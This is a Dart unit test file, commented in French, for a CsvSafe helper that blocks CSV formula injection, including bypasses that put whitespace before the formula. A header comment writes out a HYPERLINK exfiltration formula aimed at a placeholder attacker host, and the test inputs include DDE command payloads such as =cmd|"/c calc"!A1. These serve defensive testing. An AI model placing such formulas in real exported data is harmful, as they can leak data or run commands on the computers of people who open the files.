import 'package:flutter_test/flutter_test.dart';
import 'package:read_files_tech/utils/csv_safe.dart';

/// Tests CsvSafe (H1 v2.12.1) — anti CSV-injection.
///
/// Vise les classiques OWASP : `= + - @ \t \r` en début de cellule sont
/// interprétés comme formule par Excel / LibreOffice / Numbers → vecteur
/// d'exfiltration via `=HYPERLINK("http://attacker/?x=" & A2, "click")`.
void main() {
  group('CsvSafe.sanitizeCell', () {
    test('préfixe = + - @ par une apostrophe', () {
      expect(CsvSafe.sanitizeCell('=1+1'), equals("'=1+1"));
      expect(CsvSafe.sanitizeCell('+CMD'), equals("'+CMD"));
      expect(CsvSafe.sanitizeCell('-2+3'), equals("'-2+3"));
      expect(CsvSafe.sanitizeCell('@SUM(A1:A9)'), equals("'@SUM(A1:A9)"));
    });

    test('préfixe \\t et \\r (anti masquage)', () {
      expect(CsvSafe.sanitizeCell('\t=BAD'), equals("'\t=BAD"));
      expect(CsvSafe.sanitizeCell('\r=BAD'), equals("'\r=BAD"));
    });

    test('laisse intactes les cellules sûres', () {
      expect(CsvSafe.sanitizeCell('Hello'), equals('Hello'));
      expect(CsvSafe.sanitizeCell('42'), equals('42'));
      expect(CsvSafe.sanitizeCell(''), equals(''));
      expect(CsvSafe.sanitizeCell('1=2'), equals('1=2'));
    });

    test('ne touche pas aux non-String (int, double, null)', () {
      expect(CsvSafe.sanitizeCell(42), equals(42));
      expect(CsvSafe.sanitizeCell(3.14), equals(3.14));
      expect(CsvSafe.sanitizeCell(null), isNull);
    });
  });

  group('CsvSafe.encodeSafe', () {
    test('encode des lignes en CSV avec sanitization par cellule', () {
      final out = CsvSafe.encodeSafe([
        ['Nom', 'Valeur'],
        ['Patrice', '=cmd|"/c calc"!A1'],
        ['Sécu', 'OK'],
      ]);
      // La cellule dangereuse doit être préfixée
      expect(out, contains("'=cmd|"));
      // Les cellules normales restent intactes
      expect(out, contains('Patrice'));
      expect(out, contains('Sécu'));
    });

    test('round-trip sur dataset bénin reste lisible', () {
      final out = CsvSafe.encodeSafe([
        ['a', 'b'],
        ['1', '2'],
      ]);
      expect(out.split('\n').length, greaterThanOrEqualTo(2));
    });
  });
  group('blancs de tete — contournement comble le 2026-08-11', () {
    // Le controle ne portait que sur `cell[0]`. Une simple espace devant la
    // formule suffisait a y echapper, alors que plusieurs tableurs elaguent
    // les blancs de tete a l import et retrouvent la formule.
    test('une formule precedee d une espace est neutralisee', () {
      expect(CsvSafe.sanitizeCell(' =HYPERLINK("http://x")'), startsWith("'"));
    });

    test('une formule precedee d un saut de ligne est neutralisee', () {
      expect(CsvSafe.sanitizeCell('\n=cmd|calc'), startsWith("'"));
    });

    test(
      'une formule precedee de plusieurs blancs melanges est neutralisee',
      () {
        expect(CsvSafe.sanitizeCell('  \t\n @SUM(A1)'), startsWith("'"));
      },
    );

    test('une espace insecable ne protege pas davantage', () {
      expect(CsvSafe.sanitizeCell('\u00A0+1+1'), startsWith("'"));
    });

    test('la cellule est rendue INTACTE, blancs compris', () {
      // On neutralise la donnee, on ne la reecrit pas : le tableur masque
      // l apostrophe et l utilisateur retrouve exactement ce qu il avait.
      expect(CsvSafe.sanitizeCell(' =A1'), "' =A1");
    });

    test('du texte ordinaire precede de blancs reste inchange', () {
      expect(CsvSafe.sanitizeCell('  bonjour'), '  bonjour');
    });

    test('une cellule faite uniquement de blancs reste inchangee', () {
      expect(CsvSafe.sanitizeCell('   '), '   ');
      expect(CsvSafe.sanitizeCell('\n'), '\n');
    });
  });
}
